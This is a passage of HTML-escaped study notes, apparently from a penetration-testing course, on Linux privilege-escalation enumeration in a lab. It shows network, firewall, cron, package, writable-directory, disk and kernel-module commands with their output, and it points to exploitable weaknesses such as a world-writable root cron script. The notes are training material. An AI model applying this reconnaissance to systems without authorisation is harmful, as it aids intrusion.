+4: ens192: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:bf:fa:39 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.188.214/24 brd 192.168.188.255 scope global ens192
+       valid_lft forever preferred_lft forever
+5: ens224: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:bf:0b:7d brd ff:ff:ff:ff:ff:ff
+    inet 172.16.128.214/24 brd 172.16.128.255 scope global ens224
+       valid_lft forever preferred_lft forever
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Based on this output, we see the system connects to more than one network.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can display routing tables with &lt;code&gt;route&lt;/code&gt; or &lt;code&gt;routel&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ routel
+         target            gateway          source    proto    scope    dev tbl
+        default    192.168.188.254                   static          ens192 
+   172.16.128.0 24                  172.16.128.214   kernel     link ens224 
+  192.168.188.0 24                 192.168.188.214   kernel     link ens192 
+      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
+      127.0.0.0 8            local       127.0.0.1   kernel     host     lo local
+      127.0.0.1              local       127.0.0.1   kernel     host     lo local
+127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
+   172.16.128.0          broadcast  172.16.128.214   kernel     link ens224 local
+ 172.16.128.214              local  172.16.128.214   kernel     host ens224 local
+ 172.16.128.255          broadcast  172.16.128.214   kernel     link ens224 local
+  192.168.188.0          broadcast 192.168.188.214   kernel     link ens192 local
+192.168.188.214              local 192.168.188.214   kernel     host ens192 local
+192.168.188.255          broadcast 192.168.188.214   kernel     link ens192 local
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can display active network connections and listening ports with &lt;code&gt;netstat&lt;/code&gt; or &lt;code&gt;ss&lt;/code&gt;, which both accept the same arguments.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;List all connections &lt;code&gt;-a&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Avoid hostname resolution &lt;code&gt;-n&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;List proc name the conn belongs to with &lt;code&gt;-p&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ ss -anp
+Netid  State      Recv-Q  Send-Q                              Local Address:Port              Peer Address:Port                                                                   
+nl     UNCONN     0       0                                               0:466                           *                                                                       
+...                                                                      
+udp    UNCONN     0       0                                            [::]:5353                      [::]:*                                                                      
+tcp    LISTEN     0       128                                       0.0.0.0:80                     0.0.0.0:*                                                                      
+tcp    LISTEN     0       128                                       0.0.0.0:22                     0.0.0.0:*                                                                      
+tcp    LISTEN     0       5                                       127.0.0.1:631                    0.0.0.0:*                                                                      
+tcp    ESTAB      0       36                                192.168.188.214:22              192.168.45.182:37184                                                                  
+tcp    TIME-WAIT  0       0                                       127.0.0.1:43288                127.0.0.1:4444                                                                   
+tcp    TIME-WAIT  0       0                                       127.0.0.1:40600                127.0.0.1:22                                                                     
+tcp    TIME-WAIT  0       0                                       127.0.0.1:43416                127.0.0.1:4444                                                                   
+tcp    TIME-WAIT  0       0                                       127.0.0.1:41066                127.0.0.1:22                                                                     
+tcp    TIME-WAIT  0       0                                       127.0.0.1:34284                127.0.0.1:4444                                                                   
+tcp    TIME-WAIT  0       0                                       127.0.0.1:58016                127.0.0.1:22                                                                     
+tcp    TIME-WAIT  0       0                                       127.0.0.1:40866                127.0.0.1:4444                                                                   
+tcp    TIME-WAIT  0       0                                       127.0.0.1:36032                127.0.0.1:22                                                                     
+tcp    LISTEN     0       128                                          [::]:22                        [::]:*                                                                      
+v_str  ESTAB      0       0                                      2659772525:1023                         0:976
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Output shows various listening ports and active sessions.&lt;/li&gt;
+&lt;li&gt;Including our SSH session and listening socket.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Next we inspect firewall rules.  Generally we are interested in the firewall state, profile, and rules during the remote exploitation phase, but this info can also be useful during PrivEsc.  Example, if a network service is not remotely accessible we can likely access it via the lo iface.  If we can interact with those service locally, we can attempt to exploit them for PrivEsc.&lt;/p&gt;
+&lt;p&gt;We should also father info about in/out-bound port filters to support port forwarding/tunneling when we need to pivot to an internal network.&lt;/p&gt;
+&lt;p&gt;On Linux, we need root to list firewall rules with IPtables.  Depending on how the firsway is configured, we may be able to obtain some some info as a standard user.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;iptables-persistent&lt;/code&gt; Debian package save firewall rules in certain files under &lt;code&gt;/etc/iptables/&lt;/code&gt; by default and uses them to restore &lt;code&gt;netfilter&lt;/code&gt; rules at boot time.  These files often have weak perms, allowing a local user to read them.&lt;/p&gt;
+&lt;p&gt;We can also search for &lt;code&gt;iptables-save&lt;/code&gt; created files, which dumps the firewall conf to a user specified file.  This file is then used as input to the &lt;code&gt;iptables-restore&lt;/code&gt; command, restoring firewall rules at next boot.  If an admin has ever run this command, we could search &lt;code&gt;/etc&lt;/code&gt; or grep the FS for &lt;code&gt;iptables&lt;/code&gt; commands to locate them.  If the file perms are weak, we can read them to infer firewall rules in use on the system.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ cat /etc/iptables/rules.v4 
+# Generated by xtables-save v1.8.2 on Thu Aug 18 12:53:22 2022
+*filter
+:INPUT ACCEPT [0:0]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [0:0]
+-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
+COMMIT
+# Completed on Thu Aug 18 12:53:22 2022
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Since the file is RO by users other than root, we can inspect it.&lt;/li&gt;
+&lt;li&gt;Notice the non-default rule explicitly allowing the dest port 1999.&lt;/li&gt;
+&lt;li&gt;This should be noted for further inspection.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Next we examine scheduled tasks, commonly leveraged during PrivEsc.  Server systems often execute automated scheduled tasks.  When misconfigured or user created file perms are weak, we can modify the files that will be exec by the scheduling system with high level of priv.&lt;/p&gt;
+&lt;p&gt;The Linux job scheduler is called &lt;code&gt;cron&lt;/code&gt;.  Tasks are listed under &lt;code&gt;/etc/cron.*&lt;/code&gt; dirs, where &lt;code&gt;*&lt;/code&gt; represents the frequency the task runs at.  For instance, daily tasks will be stored under &lt;code&gt;/etc/cron.daily&lt;/code&gt;, each script is listed in its own subdir.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ ls -lah /etc/cron*
+-rw-r--r-- 1 root root 1.1K Oct 11  2019 /etc/crontab
+
+/etc/cron.d:
+total 24K
+drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rw-r--r--   1 root root  285 May 19  2019 anacron
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.daily:
+total 60K
+drwxr-xr-x   2 root root 4.0K Aug 18  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rwxr-xr-x   1 root root  311 May 19  2019 0anacron
+-rwxr-xr-x   1 root root  539 Aug  8  2020 apache2
+-rwxr-xr-x   1 root root 1.5K Dec  7  2020 apt-compat
+-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x   1 root root  384 Dec 31  2018 cracklib-runtime
+-rwxr-xr-x   1 root root 1.2K Apr 18  2019 dpkg
+-rwxr-xr-x   1 root root 2.2K Feb 10  2018 locate
+-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
+-rwxr-xr-x   1 root root 1.1K Feb 10  2019 man-db
+-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.hourly:
+total 20K
+drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.monthly:
+total 24K
+drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rwxr-xr-x   1 root root  313 May 19  2019 0anacron
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.weekly:
+total 28K
+drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rwxr-xr-x   1 root root  312 May 19  2019 0anacron
+-rwxr-xr-x   1 root root  813 Feb 10  2019 man-db
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We find several daily tasks.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Note that sys admins often add their own sched tasks to &lt;code&gt;/etc/crontab&lt;/code&gt; and they should be inspected carefully for weak perms.  Most jobs will run as root.  They can be viewed with &lt;code&gt;crontab -l&lt;/code&gt;.  Running the command with &lt;code&gt;sudo&lt;/code&gt; will show a root &lt;code&gt;crontab&lt;/code&gt;.  Always check both user and root crontab.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# m h  dom mon dow   command
+* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We find a backup job in the root crontab.&lt;/li&gt;
+&lt;li&gt;If the script perms are weak, we can leverage it for PrivEsc.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;As we&amp;#39;ll learn later in this Module, the joe user has been granted specific sudo permission only to list cron jobs running as the root user. This permission alone cannot be abused to obtain a root shell.&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We will at some point need to leverage exploits to achieve PrivEsc.  In this case we must start with enumerating the installed apps and versions, to search for matching exploits.&lt;/p&gt;
+&lt;p&gt;Manually searching app info can be time consuming, we will learn how to automate this, but we should know how to manually query installed packages as needed.&lt;/p&gt;
+&lt;p&gt;Linux distros use many different package managers.  Debian based distros use &lt;code&gt;dpkg&lt;/code&gt; whereas Red Hat uses &lt;code&gt;rpm&lt;/code&gt;.  To list packages on Debian we ues &lt;code&gt;dpkg -l&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ dpkg -l
+Desired=Unknown/Install/Remove/Purge/Hold
+| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
+||/ Name                                  Version                                      Ar
++++-=====================================-============================================-==
+ii  accountsservice                       0.6.45-2                                     am
+ii  acl                                   2.2.53-4                                     am
+ii  adduser                               3.118                                        al
+ii  adwaita-icon-theme                    3.30.1-1                                     al
+ii  aisleriot                             1:3.22.7-2                                   am
+ii  alsa-utils                            1.1.8-2                                      am
+ii  anacron                               2.3-28                                       am
+ii  analog                                2:6.0-22                                     am
+ii  apache2                               2.4.38-3+deb10u7                             am
+ii  apache2-bin                           2.4.38-3+deb10u7                             am
+ii  apache2-data                          2.4.38-3+deb10u7                             al
+ii  apache2-doc                           2.4.38-3+deb10u7                             al
+ii  apache2-utils                         2.4.38-3+deb10u7                             am
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;This confirms our expectation from enumerating open ports, this machine runs a web server.&lt;/li&gt;
+&lt;li&gt;In this case &lt;code&gt;Apache2&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As we know, files with insufficient access restrictions can create a vuln that may grant an attacker elevated privs.  This can happen when an attacker can modify scripts or binaries that are executed under the context of a privileged account.&lt;/p&gt;
+&lt;p&gt;Sensitive files that are readable by an unpriv user can also contain important info such as creds to DBs or service accounts running with elevated privs.&lt;/p&gt;
+&lt;p&gt;It is not feasible to manually check the perms of each file and dir, we must automate this task.  To start, we can use &lt;code&gt;find&lt;/code&gt; to ID files with insecure perms.  We can search for every dir writable by current user on the target with flags:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/&lt;/code&gt; to search the entire root.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-writable&lt;/code&gt; to specify attribute.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;type d&lt;/code&gt; for dirs.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;2&amp;gt;/dev/null&lt;/code&gt; to filter errors.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ find / -writable -type d 2&amp;gt;/dev/null
+/run/user/1000
+/run/user/1000/pulse
+/run/user/1000/gnupg
+/run/user/1000/systemd
+/run/lock
+/home/joe
+/home/joe/Videos
+/home/joe/Templates
+/home/joe/.local
+/home/joe/.local/share
+/home/joe/.local/share/sounds
+/home/joe/.local/share/evolution
+/home/joe/.local/share/evolution/tasks
+/home/joe/.local/share/evolution/tasks/system
+/home/joe/.local/share/evolution/tasks/trash
+/home/joe/.local/share/evolution/addressbook
+/home/joe/.local/share/evolution/addressbook/system
+/home/joe/.local/share/evolution/addressbook/system/photos
+/home/joe/.local/share/evolution/addressbook/trash
+/home/joe/.local/share/evolution/mail
+/home/joe/.local/share/evolution/mail/trash
+/home/joe/.local/share/evolution/memos
+/home/joe/.local/share/evolution/memos/system
+/home/joe/.local/share/evolution/memos/trash
+/home/joe/.local/share/evolution/calendar
+/home/joe/.local/share/evolution/calendar/system
+/home/joe/.local/share/evolution/calendar/trash
+/home/joe/.local/share/icc
+/home/joe/.local/share/gnome-shell
+/home/joe/.local/share/gnome-settings-daemon
+/home/joe/.local/share/keyrings
+/home/joe/.local/share/tracker
+/home/joe/.local/share/tracker/data
+/home/joe/.local/share/folks
+/home/joe/.local/share/gvfs-metadata
+/home/joe/.local/share/applications
+/home/joe/.local/share/nano
+/home/joe/Downloads
+/home/joe/.scripts
+/home/joe/Pictures
+/home/joe/.cache
+/home/joe/.cache/gnome-calculator
+/home/joe/.cache/evolution
+/home/joe/.cache/evolution/tasks
+/home/joe/.cache/evolution/tasks/trash
+/home/joe/.cache/evolution/sources
+/home/joe/.cache/evolution/sources/trash
+/home/joe/.cache/evolution/addressbook
+/home/joe/.cache/evolution/addressbook/trash
+/home/joe/.cache/evolution/mail
+/home/joe/.cache/evolution/mail/trash
+/home/joe/.cache/evolution/memos
+/home/joe/.cache/evolution/memos/trash
+/home/joe/.cache/evolution/calendar
+/home/joe/.cache/evolution/calendar/trash
+/home/joe/.cache/libgweather
+/home/joe/.cache/tracker
+/home/joe/.cache/folks
+/home/joe/.cache/folks/avatars
+/home/joe/.cache/obexd
+/home/joe/.cache/gnome-software
+/home/joe/.cache/gnome-software/fwupd
+/home/joe/.cache/gnome-software/fwupd/remotes.d
+/home/joe/.cache/gnome-software/fwupd/remotes.d/lvfs
+/home/joe/.cache/gnome-software/odrs
+/home/joe/.cache/gnome-software/shell-extensions
+/home/joe/.cache/gstreamer-1.0
+/home/joe/Documents
+/home/joe/.gnupg
+/home/joe/.gnupg/private-keys-v1.d
+/home/joe/Music
+/home/joe/Desktop
+/home/joe/.config
+/home/joe/.config/ibus
+/home/joe/.config/ibus/bus
+/home/joe/.config/evolution
+/home/joe/.config/evolution/sources
+/home/joe/.config/gnome-session
+/home/joe/.config/gnome-session/saved-session
+/home/joe/.config/gtk-3.0
+/home/joe/.config/dconf
+/home/joe/.config/procps
+/home/joe/.config/pulse
+/home/joe/.config/goa-1.0
+/home/joe/.config/nautilus
+/home/joe/.ssh
+/home/joe/Public
+/tmp
+/tmp/.XIM-unix
+/tmp/.Test-unix
+/tmp/.ICE-unix
+/tmp/.X11-unix
+/tmp/.font-unix
+/proc/6784/task/6784/fd
+/proc/6784/fd
+/proc/6784/map_files
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
+/dev/mqueue
+/dev/shm
+/var/tmp
+/usr/share/ppd/custom
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Several dirs are world writable.&lt;/li&gt;
+&lt;li&gt;Including &lt;code&gt;/home/joe/.scripts&lt;/code&gt; which contains a cron script.&lt;/li&gt;
+&lt;li&gt;This warrants further investigation.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;On most systems drives automatically mount at boot, but we should always look for unmounted drives which may contain valuable info.  If they exist, check the mount perms.  We can use &lt;code&gt;mount&lt;/code&gt; to list all mounted FS and view &lt;code&gt;/etc/fstab&lt;/code&gt; to list all drives mounted at boot time.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ cat /etc/fstab 
+# /etc/fstab: static file system information.
+#
+# Use &amp;#39;blkid&amp;#39; to print the universally unique identifier for a
+# device; this may be used with UUID= as a more robust way to name devices
+# that works even if disks are added and removed. See fstab(5).
+#
+# &amp;lt;file system&amp;gt; &amp;lt;mount point&amp;gt;   &amp;lt;type&amp;gt;  &amp;lt;options&amp;gt;       &amp;lt;dump&amp;gt;  &amp;lt;pass&amp;gt;
+# / was on /dev/sda1 during installation
+UUID=60b4af9b-bc53-4213-909b-a2c5e090e261 /               ext4    errors=remount-ro 0       1
+# swap was on /dev/sda5 during installation
+UUID=86dc11f3-4b41-4e06-b923-86e78eaddab7 none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+joe@debian-privesc:~$ mount
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001064k,nr_inodes=250266,mode=755)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=204196k,mode=755)
+/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
+securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
+tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
+cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
+pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
+bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=34,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=9209)
+mqueue on /dev/mqueue type mqueue (rw,relatime)
+debugfs on /sys/kernel/debug type debugfs (rw,relatime)
+hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
+tmpfs on /run/user/117 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=117,gid=124)
+tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1000,gid=1000)
+binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
+tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
+tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1001,gid=1001)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The output show the swap part and primary ext4 disk.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Keep in mind that the system administrator might have used custom configurations or scripts to mount drives that are not listed in the /etc/fstab file. Because of this, it&amp;#39;s good practice to not only scan /etc/fstab, but to also gather information about mounted drives using mount.&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can then use &lt;code&gt;lsblk&lt;/code&gt; to view all disks.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ lsblk
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda      8:0    0   32G  0 disk 
+├─sda1   8:1    0   31G  0 part /
+├─sda2   8:2    0    1K  0 part 
+└─sda5   8:5    0  975M  0 part [SWAP]
+sr0     11:0    1 1024M  0 rom 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Sda consists of 3 parts.&lt;/li&gt;
+&lt;li&gt;Showing info for all disks may reveal parts that are not mounted.&lt;/li&gt;
+&lt;li&gt;Depending on config, we may be able to mount these and search for info.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Another common method is to exploit device drivers and kernel modules, let&amp;#39;s examine enumeration techniques.  Enumerate modules loaded on target with &lt;code&gt;lsmod&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ lsmod
+Module                  Size  Used by
+binfmt_misc            20480  1
+crct10dif_pclmul       16384  0
+vmw_balloon            20480  0
+crc32_pclmul           16384  0
+joydev                 24576  0
+ghash_clmulni_intel    16384  0
+serio_raw              16384  0
+pcspkr                 16384  0
+sg                     36864  0
+vmw_vsock_vmci_transport    32768  1
+vsock                  40960  2 vmw_vsock_vmci_transport
+vmw_vmci               81920  2 vmw_balloon,vmw_vsock_vmci_transport
+evdev                  28672  6
+ac                     16384  0
+nft_counter            16384  1
+xt_tcpudp              16384  1
+nft_compat             20480  1
+nf_tables             143360  5 nft_compat,nft_counter
+nfnetlink              16384  2 nft_compat,nf_tables
+parport_pc             32768  0
+ppdev                  20480  0
+lp                     20480  0
+parport                57344  3 parport_pc,lp,ppdev
+ip_tables              28672  0
+x_tables               45056  3 nft_compat,xt_tcpudp,ip_tables
+autofs4                49152  2
+ext4                  749568  1
+crc16                  16384  1 ext4
+mbcache                16384  1 ext4
+jbd2                  122880  1 ext4
+crc32c_generic         16384  0
+fscrypto               32768  1 ext4
+ecb                    16384  0
+sr_mod                 28672  0
+cdrom                  65536  1 sr_mod
+ata_generic            16384  0
+crc32c_intel           24576  2
+sd_mod                 61440  3
+vmwgfx                331776  3
+aesni_intel           200704  0
+ttm                   126976  1 vmwgfx
+drm_kms_helper        208896  1 vmwgfx
+ata_piix               36864  0
+aes_x86_64             20480  1 aesni_intel
+crypto_simd            16384  1 aesni_intel
+cryptd                 28672  3 crypto_simd,ghash_clmulni_intel,aesni_intel
+glue_helper            16384  1 aesni_intel
+drm                   495616  6 vmwgfx,drm_kms_helper,ttm
+psmouse               172032  0
+libata                270336  2 ata_piix,ata_generic
+vmw_pvscsi             28672  2
+scsi_mod              249856  5 vmw_pvscsi,sd_mod,libata,sg,sr_mod
+vmxnet3                69632  0
+i2c_piix4              24576  0
+button                 20480  0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Once we list loaded mods and ID interesting ones, we can see more info with &lt;code&gt;modinfo&lt;/code&gt; (requires full path to run).&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ /sbin/modinfo libata
+filename:       /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
+version:        3.00
+license:        GPL
+description:    Library module for ATA devices
+author:         Jeff Garzik
+srcversion:     00E4F01BB3AA2AAF98137BF
+depends:        scsi_mod
+retpoline:      Y
+intree:         Y
+name:           libata
+vermagic:       4.19.0-21-amd64 SMP mod_unload modversions 
+sig_id:         PKCS#7
+signer:         Debian Secure Boot CA
+sig_key:        4B:6E:F5:AB:CA:66:98:25:17:8E:05:2C:84:66:7C:CB:C0:53:1F:8C
+sig_hashalgo:   sha256
+signature:      89:BC:89:3C:6B:C9:55:B9:EC:9C:AD:D8:8A:76:C5:0D:8C:F0:88:26:
+        2C:09:B9:36:34:FE:B0:5D:0D:84:BA:10:B9:12:3A:C6:41:C5:90:66:
+        46:09:7B:33:91:7B:E6:E3:F2:F7:B9:E7:5D:E7:E1:F9:8D:8F:DF:31:
+        21:47:B3:76:90:4E:F1:45:2E:65:6F:63:61:B9:5D:53:40:84:96:F5:
+        61:1A:1A:2D:EF:5B:82:65:BD:24:60:AD:DB:68:60:F8:F2:3F:CD:11:
+        DC:D5:7B:61:81:A3:6C:95:46:09:6C:CB:F0:66:FC:40:55:17:F2:71:
+        7F:B8:43:0B:07:2A:79:FB:A7:CD:FF:C6:34:4D:78:5B:71:53:2C:0F:
+        0A:BC:AE:3C:6F:38:3A:5E:CB:26:96:6B:9B:C7:BE:C7:6F:C8:9D:88:
+        93:61:B9:12:2F:AC:4B:D1:F0:23:30:AD:A5:B1:30:A7:4A:EA:96:5F:
+        26:DF:B3:73:AD:00:3D:B5:9D:B1:3C:C7:01:D9:A8:86:73:EE:A8:4D:
+        2B:62:AD:2B:B8:DE:0A:33:F6:3D:13:29:36:17:A7:14:F1:C5:C5:11:
+        37:60:52:31:9E:B4:BD:B1:64:A5:5E:47:3E:D2:5F:77:89:74:2E:E2:
+        47:5B:22:34:C7:F7:A5:81:A1:BF:BA:72:A0:E5:CF:69
+parm:           zpodd_poweroff_delay:Poweroff delay for ZPODD in seconds (int)
+parm:           acpi_gtf_filter:filter mask for ACPI _GTF commands, set to filter out (0x1=set xfermode, 0x2=lock/freeze lock, 0x4=DIPM, 0x8=FPDMA non-zero offset, 0x10=FPDMA DMA Setup FIS auto-activate) (int)
+parm:           force:Force ATA configurations including cable type, link speed and transfer mode (see Documentation/admin-guide/kernel-parameters.rst for details) (string)
+parm:           atapi_enabled:Enable discovery of ATAPI devices (0=off, 1=on [default]) (int)
+parm:           atapi_dmadir:Enable ATAPI DMADIR bridge support (0=off [default], 1=on) (int)
+parm:           atapi_passthru16:Enable ATA_16 passthru for ATAPI devices (0=off, 1=on [default]) (int)
+parm:           fua:FUA support (0=off [default], 1=on) (int)
+parm:           ignore_hpa:Ignore HPA limit (0=keep BIOS limits, 1=ignore limits, using full disk) (int)
+parm:           dma:DMA enable/disable (0x1==ATA, 0x2==ATAPI, 0x4==CF) (int)
+parm:           ata_probe_timeout:Set ATA probing timeout (seconds) (int)
+parm:           noacpi:Disable the use of ACPI in probe/suspend/resume (0=off [default], 1=on) (int)
+parm:           allow_tpm:Permit the use of TPM commands (0=off [default], 1=on) (int)
+parm:           atapi_an:Enable ATAPI AN media presence notification (0=0ff [default], 1=on) (int)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;This info better positions us to find appropriate exploits.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;There are a few enumerations to be aware of that may provide a &lt;strong&gt;shortcut to PriveEsc&lt;/strong&gt;.  Other than &lt;code&gt;rwx&lt;/code&gt; file perms there are two &lt;em&gt;special rights&lt;/em&gt; pertaining to exec files:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;setuid&lt;/code&gt; and &lt;code&gt;setgid&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Symbolized with upper or lower case &lt;code&gt;s&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Allows current user to exec the file with rights of the owner (setuid) or the owner&amp;#39;s group (setgid)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;When run, an exec normally inherits the rights of the user that runs it.  If SUID perms are set, the bin will run with the perms of the file owner.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;If a bin has the SUID bit set and the owner is root.&lt;/li&gt;
